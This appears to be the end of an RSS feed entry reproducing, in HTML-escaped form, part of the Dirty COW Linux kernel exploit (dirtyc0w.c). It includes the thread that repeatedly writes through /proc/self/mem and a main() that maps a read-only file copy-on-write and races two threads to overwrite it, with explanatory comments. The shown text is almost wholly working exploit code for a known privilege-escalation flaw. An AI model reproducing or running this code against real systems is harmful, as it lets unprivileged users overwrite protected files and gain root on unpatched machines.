You have to write to /proc/self/mem :: https://bugzilla.redhat.com/sh ... 23c16
&amp;gt;  The in the wild exploit we are aware of doesn&#39;t work on Red Hat
&amp;gt;  Enterprise Linux 5 and 6 out of the box because on one side of
&amp;gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not
&amp;gt;  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open(&amp;quot;/proc/self/mem&amp;quot;,O_RDWR);
  int i,c=0;
  for(i=0;i&amp;lt;100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf(&amp;quot;procselfmem %d\n\n&amp;quot;, c);
}
  
  
int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc&amp;lt;3)return 1;
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  f=open(argv[1],O_RDONLY);
  fstat(f,&amp;amp;st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
&amp;gt; Create a private copy-on-write mapping.  Updates to the
&amp;gt; mapping are not visible to other processes mapping the same
&amp;gt; file, and are not carried through to the underlying file.  It
&amp;gt; is unspecified whether changes made to the file after the
&amp;gt; mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf(&amp;quot;mmap %x\n\n&amp;quot;,map);
/*
You have to do it on two threads.
*/
  pthread_create(&amp;amp;pth1,NULL,madviseThread,argv[1]);
  pthread_create(&amp;amp;pth2,NULL,procselfmemThread,argv[2]);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
  </channel>
</rss>